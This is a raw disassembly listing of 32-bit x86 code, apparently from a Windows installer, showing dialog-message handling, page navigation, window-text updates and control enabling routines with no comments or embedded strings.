  403a6c:	e8 70 24 00 00       	call   0x405ee1
  403a71:	8b 35 64 37 42 00    	mov    0x423764,%esi
  403a77:	85 f6                	test   %esi,%esi
  403a79:	74 45                	je     0x403ac0
  403a7b:	8b 0d 14 37 42 00    	mov    0x423714,%ecx
  403a81:	8b 49 64             	mov    0x64(%ecx),%ecx
  403a84:	8b d1                	mov    %ecx,%edx
  403a86:	0f af ce             	imul   %esi,%ecx
  403a89:	f7 da                	neg    %edx
  403a8b:	03 0d 60 37 42 00    	add    0x423760,%ecx
  403a91:	03 ca                	add    %edx,%ecx
  403a93:	4e                   	dec    %esi
  403a94:	66 8b 29             	mov    (%ecx),%bp
  403a97:	66 33 e8             	xor    %ax,%bp
  403a9a:	23 eb                	and    %ebx,%ebp
  403a9c:	66 85 ed             	test   %bp,%bp
  403a9f:	74 06                	je     0x403aa7
  403aa1:	85 f6                	test   %esi,%esi
  403aa3:	75 ec                	jne    0x403a91
  403aa5:	eb 19                	jmp    0x403ac0
  403aa7:	8b 51 02             	mov    0x2(%ecx),%edx
  403aaa:	89 15 e0 2e 42 00    	mov    %edx,0x422ee0
  403ab0:	8b 51 06             	mov    0x6(%ecx),%edx
  403ab3:	89 15 c8 37 42 00    	mov    %edx,0x4237c8
  403ab9:	8d 51 0a             	lea    0xa(%ecx),%edx
  403abc:	85 d2                	test   %edx,%edx
  403abe:	75 12                	jne    0x403ad2
  403ac0:	66 81 fb ff ff       	cmp    $0xffff,%bx
  403ac5:	75 07                	jne    0x403ace
  403ac7:	bb ff 03 00 00       	mov    $0x3ff,%ebx
  403acc:	eb a3                	jmp    0x403a71
  403ace:	33 db                	xor    %ebx,%ebx
  403ad0:	eb 9f                	jmp    0x403a71
  403ad2:	89 15 dc 2e 42 00    	mov    %edx,0x422edc
  403ad8:	0f b7 01             	movzwl (%ecx),%eax
  403adb:	50                   	push   %eax
  403adc:	57                   	push   %edi
  403add:	e8 e6 23 00 00       	call   0x405ec8
  403ae2:	e8 2f 00 00 00       	call   0x403b16
  403ae7:	a1 4c 37 42 00       	mov    0x42374c,%eax
  403aec:	8b 35 48 37 42 00    	mov    0x423748,%esi
  403af2:	85 c0                	test   %eax,%eax
  403af4:	74 1b                	je     0x403b11
  403af6:	8b f8                	mov    %eax,%edi
  403af8:	8b 06                	mov    (%esi),%eax
  403afa:	85 c0                	test   %eax,%eax
  403afc:	74 0a                	je     0x403b08
  403afe:	50                   	push   %eax
  403aff:	8d 46 18             	lea    0x18(%esi),%eax
  403b02:	50                   	push   %eax
  403b03:	e8 84 24 00 00       	call   0x405f8c
  403b08:	81 c6 18 04 00 00    	add    $0x418,%esi
  403b0e:	4f                   	dec    %edi
  403b0f:	75 e7                	jne    0x403af8
  403b11:	5f                   	pop    %edi
  403b12:	5e                   	pop    %esi
  403b13:	5d                   	pop    %ebp
  403b14:	5b                   	pop    %ebx
  403b15:	c3                   	ret
  403b16:	56                   	push   %esi
  403b17:	be 00 2f 42 00       	mov    $0x422f00,%esi
  403b1c:	6a fe                	push   $0xfffffffe
  403b1e:	56                   	push   %esi
  403b1f:	e8 68 24 00 00       	call   0x405f8c
  403b24:	56                   	push   %esi
  403b25:	ff 35 e8 fc 41 00    	push   0x41fce8
  403b2b:	ff 15 7c 72 40 00    	call   *0x40727c
  403b31:	8b c6                	mov    %esi,%eax
  403b33:	5e                   	pop    %esi
  403b34:	c3                   	ret
  403b35:	83 ec 10             	sub    $0x10,%esp
  403b38:	b9 10 01 00 00       	mov    $0x110,%ecx
  403b3d:	53                   	push   %ebx
  403b3e:	8b 5c 24 1c          	mov    0x1c(%esp),%ebx
  403b42:	55                   	push   %ebp
  403b43:	56                   	push   %esi
  403b44:	3b d9                	cmp    %ecx,%ebx
  403b46:	57                   	push   %edi
  403b47:	0f 84 3b 01 00 00    	je     0x403c88
  403b4d:	81 fb 08 04 00 00    	cmp    $0x408,%ebx
  403b53:	0f 84 2f 01 00 00    	je     0x403c88
  403b59:	8b 7c 24 24          	mov    0x24(%esp),%edi
  403b5d:	33 ed                	xor    %ebp,%ebp
  403b5f:	83 fb 47             	cmp    $0x47,%ebx
  403b62:	75 13                	jne    0x403b77
  403b64:	6a 13                	push   $0x13
  403b66:	55                   	push   %ebp
  403b67:	55                   	push   %ebp
  403b68:	55                   	push   %ebp
  403b69:	55                   	push   %ebp
  403b6a:	57                   	push   %edi
  403b6b:	ff 35 e8 fc 41 00    	push   0x41fce8
  403b71:	ff 15 94 71 40 00    	call   *0x407194
  403b77:	83 fb 05             	cmp    $0x5,%ebx
  403b7a:	75 18                	jne    0x403b94
  403b7c:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  403b80:	48                   	dec    %eax
  403b81:	f7 d8                	neg    %eax
  403b83:	1b c0                	sbb    %eax,%eax
  403b85:	23 c3                	and    %ebx,%eax
  403b87:	50                   	push   %eax
  403b88:	ff 35 e8 fc 41 00    	push   0x41fce8
  403b8e:	ff 15 78 72 40 00    	call   *0x407278
  403b94:	81 fb 0d 04 00 00    	cmp    $0x40d,%ebx
  403b9a:	75 1a                	jne    0x403bb6
  403b9c:	ff 35 d8 2e 42 00    	push   0x422ed8
  403ba2:	ff 15 70 72 40 00    	call   *0x407270
  403ba8:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  403bac:	a3 d8 2e 42 00       	mov    %eax,0x422ed8
  403bb1:	e9 fd 03 00 00       	jmp    0x403fb3
  403bb6:	83 fb 11             	cmp    $0x11,%ebx
  403bb9:	75 11                	jne    0x403bcc
  403bbb:	55                   	push   %ebp
  403bbc:	55                   	push   %ebp
  403bbd:	57                   	push   %edi
  403bbe:	ff 15 48 72 40 00    	call   *0x407248
  403bc4:	33 c0                	xor    %eax,%eax
  403bc6:	40                   	inc    %eax
  403bc7:	e9 0c 04 00 00       	jmp    0x403fd8
  403bcc:	81 fb 11 01 00 00    	cmp    $0x111,%ebx
  403bd2:	0f 85 9d 00 00 00    	jne    0x403c75
  403bd8:	0f b7 74 24 2c       	movzwl 0x2c(%esp),%esi
  403bdd:	56                   	push   %esi
  403bde:	57                   	push   %edi
  403bdf:	ff 15 44 72 40 00    	call   *0x407244
  403be5:	8b f8                	mov    %eax,%edi
  403be7:	3b fd                	cmp    %ebp,%edi
  403be9:	74 1d                	je     0x403c08
  403beb:	55                   	push   %ebp
  403bec:	55                   	push   %ebp
  403bed:	68 f3 00 00 00       	push   $0xf3
  403bf2:	57                   	push   %edi
  403bf3:	ff 15 00 72 40 00    	call   *0x407200
  403bf9:	57                   	push   %edi
  403bfa:	ff 15 90 71 40 00    	call   *0x407190
  403c00:	85 c0                	test   %eax,%eax
  403c02:	0f 84 ce 03 00 00    	je     0x403fd6
  403c08:	83 fe 01             	cmp    $0x1,%esi
  403c0b:	75 03                	jne    0x403c10
  403c0d:	56                   	push   %esi
  403c0e:	eb 2e                	jmp    0x403c3e
  403c10:	83 fe 03             	cmp    $0x3,%esi
  403c13:	75 0c                	jne    0x403c21
  403c15:	39 2d dc 91 40 00    	cmp    %ebp,0x4091dc
  403c1b:	7e 3f                	jle    0x403c5c
  403c1d:	6a ff                	push   $0xffffffff
  403c1f:	eb 1d                	jmp    0x403c3e
  403c21:	6a 02                	push   $0x2
  403c23:	5f                   	pop    %edi
  403c24:	3b f7                	cmp    %edi,%esi
  403c26:	75 34                	jne    0x403c5c
  403c28:	39 2d ac 37 42 00    	cmp    %ebp,0x4237ac
  403c2e:	74 15                	je     0x403c45
  403c30:	57                   	push   %edi
  403c31:	e8 d5 d7 ff ff       	call   0x40140b
  403c36:	89 3d d8 f0 41 00    	mov    %edi,0x41f0d8
  403c3c:	6a 78                	push   $0x78
  403c3e:	e8 9f 03 00 00       	call   0x403fe2
  403c43:	eb 30                	jmp    0x403c75
  403c45:	6a 03                	push   $0x3
  403c47:	e8 bf d7 ff ff       	call   0x40140b
  403c4c:	85 c0                	test   %eax,%eax
  403c4e:	75 25                	jne    0x403c75
  403c50:	c7 05 d8 f0 41 00 01 	movl   $0x1,0x41f0d8
  403c57:	00 00 00 
  403c5a:	eb e0                	jmp    0x403c3c
  403c5c:	ff 74 24 30          	push   0x30(%esp)
  403c60:	ff 74 24 30          	push   0x30(%esp)
  403c64:	68 11 01 00 00       	push   $0x111
  403c69:	ff 35 d8 2e 42 00    	push   0x422ed8
  403c6f:	ff 15 00 72 40 00    	call   *0x407200
  403c75:	ff 74 24 30          	push   0x30(%esp)
  403c79:	ff 74 24 30          	push   0x30(%esp)
  403c7d:	53                   	push   %ebx
  403c7e:	e8 ed 03 00 00       	call   0x404070
  403c83:	e9 50 03 00 00       	jmp    0x403fd8
  403c88:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  403c8c:	8b 7c 24 24          	mov    0x24(%esp),%edi
  403c90:	3b d9                	cmp    %ecx,%ebx
  403c92:	a3 f0 fc 41 00       	mov    %eax,0x41fcf0
  403c97:	75 4d                	jne    0x403ce6
  403c99:	8b 35 44 72 40 00    	mov    0x407244,%esi
  403c9f:	6a 01                	push   $0x1
  403ca1:	57                   	push   %edi
  403ca2:	89 3d 08 37 42 00    	mov    %edi,0x423708
  403ca8:	ff d6                	call   *%esi
  403caa:	6a 02                	push   $0x2
  403cac:	57                   	push   %edi
  403cad:	a3 04 fd 41 00       	mov    %eax,0x41fd04
  403cb2:	ff d6                	call   *%esi
  403cb4:	6a ff                	push   $0xffffffff
  403cb6:	6a 1c                	push   $0x1c
  403cb8:	57                   	push   %edi
  403cb9:	a3 d0 ec 41 00       	mov    %eax,0x41ecd0
  403cbe:	e8 46 03 00 00       	call   0x404009
  403cc3:	ff 35 e8 2e 42 00    	push   0x422ee8
  403cc9:	6a f2                	push   $0xfffffff2
  403ccb:	57                   	push   %edi
  403ccc:	ff 15 8c 71 40 00    	call   *0x40718c
  403cd2:	6a 04                	push   $0x4
  403cd4:	e8 32 d7 ff ff       	call   0x40140b
  403cd9:	a3 cc 2e 42 00       	mov    %eax,0x422ecc
  403cde:	33 c0                	xor    %eax,%eax
  403ce0:	40                   	inc    %eax
  403ce1:	a3 f0 fc 41 00       	mov    %eax,0x41fcf0
  403ce6:	8b 0d dc 91 40 00    	mov    0x4091dc,%ecx
  403cec:	33 ed                	xor    %ebp,%ebp
  403cee:	8b f1                	mov    %ecx,%esi
  403cf0:	c1 e6 06             	shl    $0x6,%esi
  403cf3:	03 35 40 37 42 00    	add    0x423740,%esi
  403cf9:	3b cd                	cmp    %ebp,%ecx
  403cfb:	7c 3e                	jl     0x403d3b
  403cfd:	83 f8 01             	cmp    $0x1,%eax
  403d00:	75 31                	jne    0x403d33
  403d02:	55                   	push   %ebp
  403d03:	ff 76 10             	push   0x10(%esi)
  403d06:	e8 7e d6 ff ff       	call   0x401389
  403d0b:	85 c0                	test   %eax,%eax
  403d0d:	74 24                	je     0x403d33
  403d0f:	6a 01                	push   $0x1
  403d11:	55                   	push   %ebp
  403d12:	68 0f 04 00 00       	push   $0x40f
  403d17:	ff 35 d8 2e 42 00    	push   0x422ed8
  403d1d:	ff 15 00 72 40 00    	call   *0x407200
  403d23:	33 c0                	xor    %eax,%eax
  403d25:	39 2d cc 2e 42 00    	cmp    %ebp,0x422ecc
  403d2b:	0f 94 c0             	sete   %al
  403d2e:	e9 a5 02 00 00       	jmp    0x403fd8
  403d33:	39 2e                	cmp    %ebp,(%esi)
  403d35:	0f 84 9b 02 00 00    	je     0x403fd6
  403d3b:	68 0b 04 00 00       	push   $0x40b
  403d40:	e8 10 03 00 00       	call   0x404055
  403d45:	a1 f0 fc 41 00       	mov    0x41fcf0,%eax
  403d4a:	01 05 dc 91 40 00    	add    %eax,0x4091dc
  403d50:	c1 e0 06             	shl    $0x6,%eax
  403d53:	03 f0                	add    %eax,%esi
  403d55:	a1 dc 91 40 00       	mov    0x4091dc,%eax
  403d5a:	3b 05 44 37 42 00    	cmp    0x423744,%eax
  403d60:	75 07                	jne    0x403d69
  403d62:	6a 01                	push   $0x1
  403d64:	e8 a2 d6 ff ff       	call   0x40140b
  403d69:	39 2d cc 2e 42 00    	cmp    %ebp,0x422ecc
  403d6f:	0f 85 1f 02 00 00    	jne    0x403f94
  403d75:	a1 44 37 42 00       	mov    0x423744,%eax
  403d7a:	39 05 dc 91 40 00    	cmp    %eax,0x4091dc
  403d80:	0f 83 0e 02 00 00    	jae    0x403f94
  403d86:	ff 76 24             	push   0x24(%esi)
  403d89:	8b 5e 14             	mov    0x14(%esi),%ebx
  403d8c:	68 00 b8 42 00       	push   $0x42b800
  403d91:	e8 f6 21 00 00       	call   0x405f8c
  403d96:	ff 76 20             	push   0x20(%esi)
  403d99:	68 19 fc ff ff       	push   $0xfffffc19
  403d9e:	57                   	push   %edi
  403d9f:	e8 65 02 00 00       	call   0x404009
  403da4:	ff 76 1c             	push   0x1c(%esi)
  403da7:	68 1b fc ff ff       	push   $0xfffffc1b
  403dac:	57                   	push   %edi
  403dad:	e8 57 02 00 00       	call   0x404009
  403db2:	ff 76 28             	push   0x28(%esi)
  403db5:	68 1a fc ff ff       	push   $0xfffffc1a
  403dba:	57                   	push   %edi
  403dbb:	e8 49 02 00 00       	call   0x404009
  403dc0:	6a 03                	push   $0x3
  403dc2:	57                   	push   %edi
  403dc3:	ff 15 44 72 40 00    	call   *0x407244
  403dc9:	39 2d ac 37 42 00    	cmp    %ebp,0x4237ac
  403dcf:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  403dd3:	74 08                	je     0x403ddd
  403dd5:	66 81 e3 fd fe       	and    $0xfefd,%bx
  403dda:	83 cb 04             	or     $0x4,%ebx
  403ddd:	8b cb                	mov    %ebx,%ecx
  403ddf:	83 e1 08             	and    $0x8,%ecx
  403de2:	51                   	push   %ecx
  403de3:	50                   	push   %eax
  403de4:	ff 15 78 72 40 00    	call   *0x407278
  403dea:	8b c3                	mov    %ebx,%eax
  403dec:	25 00 01 00 00       	and    $0x100,%eax
  403df1:	50                   	push   %eax
  403df2:	ff 74 24 30          	push   0x30(%esp)
  403df6:	ff 15 f8 71 40 00    	call   *0x4071f8
  403dfc:	8b c3                	mov    %ebx,%eax
  403dfe:	83 e0 02             	and    $0x2,%eax
  403e01:	50                   	push   %eax
  403e02:	e8 24 02 00 00       	call   0x40402b
  403e07:	83 e3 04             	and    $0x4,%ebx
  403e0a:	53                   	push   %ebx
  403e0b:	ff 35 d0 ec 41 00    	push   0x41ecd0
  403e11:	ff 15 f8 71 40 00    	call   *0x4071f8
  403e17:	3b dd                	cmp    %ebp,%ebx
  403e19:	74 03                	je     0x403e1e
  403e1b:	55                   	push   %ebp
  403e1c:	eb 02                	jmp    0x403e20
  403e1e:	6a 01                	push   $0x1
  403e20:	68 60 f0 00 00       	push   $0xf060
  403e25:	55                   	push   %ebp
  403e26:	57                   	push   %edi
  403e27:	ff 15 88 71 40 00    	call   *0x407188
  403e2d:	50                   	push   %eax
  403e2e:	ff 15 d0 71 40 00    	call   *0x4071d0
  403e34:	8b 1d 00 72 40 00    	mov    0x407200,%ebx
  403e3a:	6a 01                	push   $0x1
  403e3c:	55                   	push   %ebp
  403e3d:	68 f4 00 00 00       	push   $0xf4
  403e42:	ff 74 24 38          	push   0x38(%esp)
  403e46:	ff d3                	call   *%ebx
  403e48:	39 2d ac 37 42 00    	cmp    %ebp,0x4237ac
  403e4e:	74 13                	je     0x403e63
  403e50:	55                   	push   %ebp
  403e51:	6a 02                	push   $0x2
  403e53:	68 01 04 00 00       	push   $0x401
  403e58:	57                   	push   %edi
  403e59:	ff d3                	call   *%ebx
  403e5b:	ff 35 d0 ec 41 00    	push   0x41ecd0
  403e61:	eb 06                	jmp    0x403e69
  403e63:	ff 35 04 fd 41 00    	push   0x41fd04
  403e69:	e8 d0 01 00 00       	call   0x40403e
  403e6e:	e8 a3 fc ff ff       	call   0x403b16
  403e73:	bb 08 fd 41 00       	mov    $0x41fd08,%ebx
  403e78:	50                   	push   %eax
  403e79:	53                   	push   %ebx
  403e7a:	e8 eb 20 00 00       	call   0x405f6a
  403e7f:	ff 76 18             	push   0x18(%esi)
  403e82:	53                   	push   %ebx
  403e83:	e8 f8 20 00 00       	call   0x405f80
  403e88:	03 c3                	add    %ebx,%eax
  403e8a:	50                   	push   %eax
  403e8b:	e8 fc 20 00 00       	call   0x405f8c
  403e90:	53                   	push   %ebx
  403e91:	57                   	push   %edi
  403e92:	ff 15 7c 72 40 00    	call   *0x40727c
  403e98:	55                   	push   %ebp
  403e99:	ff 76 08             	push   0x8(%esi)
  403e9c:	e8 e8 d4 ff ff       	call   0x401389
  403ea1:	85 c0                	test   %eax,%eax
  403ea3:	0f 85 9c fe ff ff    	jne    0x403d45
  403ea9:	39 2e                	cmp    %ebp,(%esi)
  403eab:	0f 84 94 fe ff ff    	je     0x403d45
  403eb1:	83 7e 04 05          	cmpl   $0x5,0x4(%esi)
  403eb5:	75 1d                	jne    0x403ed4
  403eb7:	39 2d ac 37 42 00    	cmp    %ebp,0x4237ac
  403ebd:	0f 85 13 01 00 00    	jne    0x403fd6
  403ec3:	39 2d a0 37 42 00    	cmp    %ebp,0x4237a0
  403ec9:	0f 85 76 fe ff ff    	jne    0x403d45
  403ecf:	e9 02 01 00 00       	jmp    0x403fd6
  403ed4:	ff 35 d8 2e 42 00    	push   0x422ed8
  403eda:	ff 15 70 72 40 00    	call   *0x407270
  403ee0:	89 35 e0 f4 41 00    	mov    %esi,0x41f4e0
  403ee6:	39 2e                	cmp    %ebp,(%esi)
  403ee8:	0f 8e c5 00 00 00    	jle    0x403fb3
  403eee:	8b 46 04             	mov    0x4(%esi),%eax
  403ef1:	56                   	push   %esi
  403ef2:	ff 34 85 e0 91 40 00 	push   0x4091e0(,%eax,4)
  403ef9:	66 8b 06             	mov    (%esi),%ax
  403efc:	66 03 05 e0 2e 42 00 	add    0x422ee0,%ax
  403f03:	57                   	push   %edi
  403f04:	0f b7 c0             	movzwl %ax,%eax
  403f07:	50                   	push   %eax
  403f08:	ff 35 00 37 42 00    	push   0x423700
  403f0e:	ff 15 3c 72 40 00    	call   *0x40723c
  403f14:	3b c5                	cmp    %ebp,%eax
  403f16:	a3 d8 2e 42 00       	mov    %eax,0x422ed8
  403f1b:	0f 84 92 00 00 00    	je     0x403fb3
  403f21:	ff 76 2c             	push   0x2c(%esi)
  403f24:	6a 06                	push   $0x6
  403f26:	50                   	push   %eax
  403f27:	e8 dd 00 00 00       	call   0x404009
  403f2c:	8d 44 24 10          	lea    0x10(%esp),%eax
  403f30:	50                   	push   %eax
  403f31:	68 fa 03 00 00       	push   $0x3fa
  403f36:	57                   	push   %edi
  403f37:	ff 15 44 72 40 00    	call   *0x407244
  403f3d:	50                   	push   %eax
  403f3e:	ff 15 cc 71 40 00    	call   *0x4071cc
  403f44:	8d 44 24 10          	lea    0x10(%esp),%eax
  403f48:	50                   	push   %eax
  403f49:	57                   	push   %edi
  403f4a:	ff 15 84 71 40 00    	call   *0x407184
  403f50:	6a 15                	push   $0x15
  403f52:	55                   	push   %ebp
  403f53:	55                   	push   %ebp
  403f54:	ff 74 24 20          	push   0x20(%esp)
  403f58:	ff 74 24 20          	push   0x20(%esp)
  403f5c:	55                   	push   %ebp
  403f5d:	ff 35 d8 2e 42 00    	push   0x422ed8
  403f63:	ff 15 94 71 40 00    	call   *0x407194
  403f69:	55                   	push   %ebp
  403f6a:	ff 76 0c             	push   0xc(%esi)
  403f6d:	e8 17 d4 ff ff       	call   0x401389
  403f72:	39 2d cc 2e 42 00    	cmp    %ebp,0x422ecc
  403f78:	75 5c                	jne    0x403fd6
  403f7a:	6a 08                	push   $0x8
  403f7c:	ff 35 d8 2e 42 00    	push   0x422ed8
  403f82:	ff 15 78 72 40 00    	call   *0x407278
  403f88:	68 05 04 00 00       	push   $0x405
  403f8d:	e8 c3 00 00 00       	call   0x404055
  403f92:	eb 1f                	jmp    0x403fb3
  403f94:	ff 35 d8 2e 42 00    	push   0x422ed8
  403f9a:	ff 15 70 72 40 00    	call   *0x407270
  403fa0:	ff 35 d8 f0 41 00    	push   0x41f0d8
  403fa6:	89 2d 08 37 42 00    	mov    %ebp,0x423708
  403fac:	57                   	push   %edi
  403fad:	ff 15 18 72 40 00    	call   *0x407218
  403fb3:	39 2d 08 0d 42 00    	cmp    %ebp,0x420d08
  403fb9:	75 1b                	jne    0x403fd6
  403fbb:	39 2d d8 2e 42 00    	cmp    %ebp,0x422ed8
  403fc1:	74 13                	je     0x403fd6
  403fc3:	6a 0a                	push   $0xa
  403fc5:	57                   	push   %edi
  403fc6:	ff 15 78 72 40 00    	call   *0x407278
  403fcc:	c7 05 08 0d 42 00 01 	movl   $0x1,0x420d08
  403fd3:	00 00 00 
  403fd6:	33 c0                	xor    %eax,%eax
  403fd8:	5f                   	pop    %edi
  403fd9:	5e                   	pop    %esi
  403fda:	5d                   	pop    %ebp
  403fdb:	5b                   	pop    %ebx
  403fdc:	83 c4 10             	add    $0x10,%esp
  403fdf:	c2 10 00             	ret    $0x10
  403fe2:	83 7c 24 04 78       	cmpl   $0x78,0x4(%esp)
  403fe7:	75 06                	jne    0x403fef
  403fe9:	ff 05 cc 2e 42 00    	incl   0x422ecc
  403fef:	6a 00                	push   $0x0
  403ff1:	ff 74 24 08          	push   0x8(%esp)
  403ff5:	68 08 04 00 00       	push   $0x408
  403ffa:	ff 35 08 37 42 00    	push   0x423708
  404000:	ff 15 00 72 40 00    	call   *0x407200
  404006:	c2 04 00             	ret    $0x4
  404009:	ff 74 24 0c          	push   0xc(%esp)
  40400d:	6a 00                	push   $0x0
  40400f:	e8 78 1f 00 00       	call   0x405f8c
  404014:	50                   	push   %eax
  404015:	8b 44 24 0c          	mov    0xc(%esp),%eax
  404019:	05 e8 03 00 00       	add    $0x3e8,%eax
  40401e:	50                   	push   %eax
  40401f:	ff 74 24 0c          	push   0xc(%esp)
  404023:	e8 3c 16 00 00       	call   0x405664
  404028:	c2 0c 00             	ret    $0xc
  40402b:	ff 74 24 04          	push   0x4(%esp)
  40402f:	ff 35 04 fd 41 00    	push   0x41fd04
  404035:	ff 15 f8 71 40 00    	call   *0x4071f8
  40403b:	c2 04 00             	ret    $0x4
  40403e:	6a 01                	push   $0x1
  404040:	ff 74 24 08          	push   0x8(%esp)
  404044:	6a 28                	push   $0x28
  404046:	ff 35 08 37 42 00    	push   0x423708
  40404c:	ff 15 00 72 40 00    	call   *0x407200
  404052:	c2 04 00             	ret    $0x4
  404055:	a1 d8 2e 42 00       	mov    0x422ed8,%eax
  40405a:	85 c0                	test   %eax,%eax
  40405c:	74 0f                	je     0x40406d
  40405e:	6a 00                	push   $0x0
  404060:	6a 00                	push   $0x0
  404062:	ff 74 24 0c          	push   0xc(%esp)
  404066:	50                   	push   %eax
  404067:	ff 15 00 72 40 00    	call   *0x407200
  40406d:	c2 04 00             	ret    $0x4
  404070:	55                   	push   %ebp
  404071:	8b ec                	mov    %esp,%ebp
  404073:	83 ec 0c             	sub    $0xc,%esp
  404076:	8b 45 08             	mov    0x8(%ebp),%eax
  404079:	56                   	push   %esi
  40407a:	05 cd fe ff ff       	add    $0xfffffecd,%eax
  40407f:	83 f8 05             	cmp    $0x5,%eax
  404082:	0f 87 b0 00 00 00    	ja     0x404138
  404088:	6a eb                	push   $0xffffffeb
  40408a:	ff 75 10             	push   0x10(%ebp)
  40408d:	ff 15 9c 71 40 00    	call   *0x40719c
  404093:	8b f0                	mov    %eax,%esi
  404095:	85 f6                	test   %esi,%esi
  404097:	0f 84 9b 00 00 00    	je     0x404138
  40409d:	83 7e 08 01          	cmpl   $0x1,0x8(%esi)
  4040a1:	0f 87 91 00 00 00    	ja     0x404138
  4040a7:	83 7e 10 02          	cmpl   $0x2,0x10(%esi)
  4040ab:	0f 87 87 00 00 00    	ja     0x404138
  4040b1:	8b 4e 14             	mov    0x14(%esi),%ecx
  4040b4:	f7 c1 e0 ff ff ff    	test   $0xffffffe0,%ecx
  4040ba:	75 7c                	jne    0x404138
  4040bc:	8b 06                	mov    (%esi),%eax
  4040be:	57                   	push   %edi
  4040bf:	8b 3d 98 71 40 00    	mov    0x407198,%edi
  4040c5:	f6 c1 02             	test   $0x2,%cl
  4040c8:	74 03                	je     0x4040cd
  4040ca:	50                   	push   %eax
  4040cb:	ff d7                	call   *%edi
  4040cd:	f6 46 14 01          	testb  $0x1,0x14(%esi)
  4040d1:	74 0a                	je     0x4040dd
  4040d3:	50                   	push   %eax
  4040d4:	ff 75 0c             	push   0xc(%ebp)
  4040d7:	ff 15 58 70 40 00    	call   *0x407058
  4040dd:	ff 76 10             	push   0x10(%esi)
  4040e0:	ff 75 0c             	push   0xc(%ebp)
  4040e3:	ff 15 50 70 40 00    	call   *0x407050
  4040e9:	8b 46 04             	mov    0x4(%esi),%eax
  4040ec:	f6 46 14 08          	testb  $0x8,0x14(%esi)
  4040f0:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4040f3:	74 06                	je     0x4040fb
  4040f5:	50                   	push   %eax
  4040f6:	ff d7                	call   *%edi
  4040f8:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4040fb:	f6 46 14 04          	testb  $0x4,0x14(%esi)
  4040ff:	5f                   	pop    %edi
  404100:	74 0a                	je     0x40410c
  404102:	50                   	push   %eax
  404103:	ff 75 0c             	push   0xc(%ebp)
  404106:	ff 15 68 70 40 00    	call   *0x407068
  40410c:	f6 46 14 10          	testb  $0x10,0x14(%esi)
  404110:	74 21                	je     0x404133
  404112:	8b 46 08             	mov    0x8(%esi),%eax
  404115:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404118:	8b 46 0c             	mov    0xc(%esi),%eax
  40411b:	85 c0                	test   %eax,%eax
  40411d:	74 07                	je     0x404126
  40411f:	50                   	push   %eax
  404120:	ff 15 5c 70 40 00    	call   *0x40705c
  404126:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404129:	50                   	push   %eax
  40412a:	ff 15 64 70 40 00    	call   *0x407064
  404130:	89 46 0c             	mov    %eax,0xc(%esi)
  404133:	8b 46 0c             	mov    0xc(%esi),%eax
  404136:	eb 02                	jmp    0x40413a
  404138:	33 c0                	xor    %eax,%eax
  40413a:	5e                   	pop    %esi
  40413b:	c9                   	leave
  40413c:	c2 0c 00             	ret    $0xc
  40413f:	55                   	push   %ebp
  404140:	8b ec                	mov    %esp,%ebp
  404142:	8b 45 08             	mov    0x8(%ebp),%eax
  404145:	8b 0d d4 ec 41 00    	mov    0x41ecd4,%ecx
  40414b:	ff 75 10             	push   0x10(%ebp)
  40414e:	03 c8                	add    %eax,%ecx
  404150:	51                   	push   %ecx
  404151:	ff 75 0c             	push   0xc(%ebp)
  404154:	ff 15 a4 70 40 00    	call   *0x4070a4
  40415a:	ff 75 0c             	push   0xc(%ebp)
  40415d:	ff 15 98 70 40 00    	call   *0x407098
  404163:	8b 4d 14             	mov    0x14(%ebp),%ecx
  404166:	89 01                	mov    %eax,(%ecx)
  404168:	01 05 d4 ec 41 00    	add    %eax,0x41ecd4
  40416e:	33 c0                	xor    %eax,%eax
  404170:	5d                   	pop    %ebp
  404171:	c2 10 00             	ret    $0x10
  404174:	55                   	push   %ebp
  404175:	8b ec                	mov    %esp,%ebp
  404177:	83 ec 0c             	sub    $0xc,%esp
  40417a:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  404181:	53                   	push   %ebx
  404182:	56                   	push   %esi
  404183:	57                   	push   %edi
  404184:	0f 85 0c 01 00 00    	jne    0x404296
  40418a:	8b 5d 14             	mov    0x14(%ebp),%ebx
  40418d:	8b 7b 30             	mov    0x30(%ebx),%edi
  404190:	85 ff                	test   %edi,%edi
  404192:	7d 11                	jge    0x4041a5
  404194:	8b 0d dc 2e 42 00    	mov    0x422edc,%ecx
  40419a:	8d 04 bd 04 00 00 00 	lea    0x4(,%edi,4),%eax
  4041a1:	2b c8                	sub    %eax,%ecx
  4041a3:	8b 39                	mov    (%ecx),%edi
  4041a5:	a1 58 37 42 00       	mov    0x423758,%eax
  4041aa:	ff 73 34             	push   0x34(%ebx)
  4041ad:	03 f8                	add    %eax,%edi
  4041af:	6a 22                	push   $0x22
  4041b1:	0f be 07             	movsbl (%edi),%eax
  4041b4:	89 45 14             	mov    %eax,0x14(%ebp)
  4041b7:	8b 43 14             	mov    0x14(%ebx),%eax
  4041ba:	ff 75 08             	push   0x8(%ebp)
  4041bd:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  4041c1:	8b f0                	mov    %eax,%esi
  4041c3:	47                   	inc    %edi
  4041c4:	f7 d6                	not    %esi
  4041c6:	c1 ee 05             	shr    $0x5,%esi
  4041c9:	83 e6 01             	and    $0x1,%esi
  4041cc:	83 e0 01             	and    $0x1,%eax
  4041cf:	89 7d f4             	mov    %edi,-0xc(%ebp)
  4041d2:	c7 45 fc 3f 41 40 00 	movl   $0x40413f,-0x4(%ebp)
  4041d9:	0b f0                	or     %eax,%esi
  4041db:	e8 29 fe ff ff       	call   0x404009
  4041e0:	ff 73 38             	push   0x38(%ebx)
  4041e3:	6a 23                	push   $0x23
  4041e5:	ff 75 08             	push   0x8(%ebp)
  4041e8:	e8 1c fe ff ff       	call   0x404009
  4041ed:	33 c0                	xor    %eax,%eax
  4041ef:	6a 01                	push   $0x1
  4041f1:	85 f6                	test   %esi,%esi
  4041f3:	0f 94 c0             	sete   %al
  4041f6:	05 0a 04 00 00       	add    $0x40a,%eax
  4041fb:	50                   	push   %eax
  4041fc:	ff 75 08             	push   0x8(%ebp)
  4041ff:	ff 15 a8 71 40 00    	call   *0x4071a8
  404205:	56                   	push   %esi
  404206:	e8 20 fe ff ff       	call   0x40402b
  40420b:	68 e8 03 00 00       	push   $0x3e8
  404210:	ff 75 08             	push   0x8(%ebp)
  404213:	ff 15 44 72 40 00    	call   *0x407244
